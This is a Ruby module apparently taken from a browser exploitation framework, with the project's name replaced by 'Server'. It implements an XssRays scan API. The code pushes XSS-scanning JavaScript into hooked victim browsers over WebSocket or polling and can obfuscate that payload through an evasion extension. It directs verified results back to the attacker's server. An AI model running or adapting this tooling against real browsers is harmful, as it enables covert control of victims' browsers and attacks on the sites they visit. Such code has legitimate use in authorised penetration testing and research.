#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
module Server
  module Extension
    module Xssrays
      module API
        class Scan
          include Server::Core::Handlers::Modules::ServerJS

          #
          # Add the xssrays main JS file to the victim DOM if there is a not-yet-started scan entry in the db.
          #
          def start_scan(hb, body)
            @body = body
            config = Server::Core::Configuration.instance
            hb = Server::Core::Models::HookedBrowser.find(hb.id)
            # TODO: we should get the xssrays_scan table with more accuracy, if for some reasons we requested
            # TODO: 2 scans on the same hooked browsers, "first" could not get the right result we want
            xs = Server::Core::Models::Xssraysscan.where(hooked_browser_id: hb.id, is_started: false).first

            # stop here if there are no XssRays scans to be started
            return if xs.nil? || xs.is_started == true

            # set the scan as started
            xs.update(is_started: true)

            # build the serverjs xssrays component

            # the URI of the XssRays handler where rays should come back if the vulnerability is verified
            serverurl = Server::Core::HttpServer.instance.url
            cross_origin = xs.cross_origin
            timeout = xs.clean_timeout

            ws = Server::Core::Websocket::Websocket.instance

            # TODO: antisnatchor: prevent sending "content" multiple times.
            #                    Better leaving it after the first run, and don't send it again.
            # todo antisnatchor: remove this gsub crap adding some hook packing.

            # If we use WebSockets, just reply wih the component contents
            if config.get('server.http.websocket.enable') && ws.getsocket(hb.session)
              content = File.read(find_serverjs_component_path('server.net.xssrays')).gsub('//
              //   Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
              //   Browser Exploitation Framework (Server) - https://serverproject.com
              //   See the file \'doc/COPYING\' for copying permission
              //', '')
              add_to_body xs.id, hb.session, serverurl, cross_origin, timeout

              if config.get('server.extension.evasion.enable')
                evasion = Server::Extension::Evasion::Evasion.instance
                ws.send(evasion.obfuscate(content) + @body, hb.session)
              else
                ws.send(content + @body, hb.session)
              end
            # If we use XHR-polling, add the component to the main hook file
            else
              build_missing_serverjs_components 'server.net.xssrays'
              add_to_body xs.id, hb.session, serverurl, cross_origin, timeout
            end

            print_debug("[XSSRAYS] Adding XssRays to the DOM. Scan id [#{xs.id}], started at [#{xs.scan_start}], cross origin [#{cross_origin}], clean timeout [#{timeout}].")
          end

          def add_to_body(id, session, serverurl, cross_origin, timeout)
            config = Server::Core::Configuration.instance

            req = %{
              server.execute(function() {
                server.net.xssrays.startScan('#{id}', '#{session}', '#{serverurl}', #{cross_origin}, #{timeout});
              });
            }

            if config.get('server.extension.evasion.enable')
              evasion = Server::Extension::Evasion::Evasion.instance
              @body << evasion.obfuscate(req)
            else
              @body << req
            end
          end
        end
      end
    end
  end
end
